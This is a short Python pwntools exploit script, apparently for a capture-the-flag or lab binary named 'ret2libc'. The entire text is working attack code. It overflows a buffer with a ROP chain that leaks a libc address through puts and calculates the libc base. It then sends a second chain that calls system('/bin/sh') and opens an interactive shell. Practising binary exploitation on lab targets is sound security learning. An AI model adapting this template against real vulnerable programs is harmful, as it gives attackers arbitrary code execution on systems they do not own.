from pwn import * # Import pwntools

p = process("./ret2libc") # start the vuln binary
elf = ELF("./ret2libc")# Extract data from binary
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
rop = ROP(elf)# Find ROP gadgets

PUTS = elf.plt['puts']
MAIN = elf.symbols['main']
LIBC_START_MAIN = elf.symbols['__libc_start_main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]# Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (rop.find_gadget(['ret']))[0]

log.info("puts@plt: " + hex(PUTS))
log.info("__libc_start_main: " + hex(LIBC_START_MAIN))
log.info("pop rdi gadget: " + hex(POP_RDI))

#Overflow buffer until return address
base = b"A"*32 + b"B"*8
# Create rop chain
rop = base + p64(POP_RDI) + p64(LIBC_START_MAIN) +  p64(PUTS) + p64(MAIN)

#Send our rop-chain payload
p.sendlineafter("ROP.", rop)

#Parse leaked address
p.recvline()
p.recvline()
recieved = p.recvline().strip()
leak = u64(recieved.ljust(8, b"\x00"))
log.info("Leaked libc address,  __libc_start_main: %s" % hex(leak))


libc.address = leak - libc.sym["__libc_start_main"]
log.info("Address of libc %s " % hex(libc.address))

BINSH = next(libc.search(b"/bin/sh")) #Verify with find /bin/sh
SYSTEM = libc.sym["system"]

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))

rop2 = base + p64(RET) + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM)

p.sendlineafter("ROP.", rop2)

p.interactive()
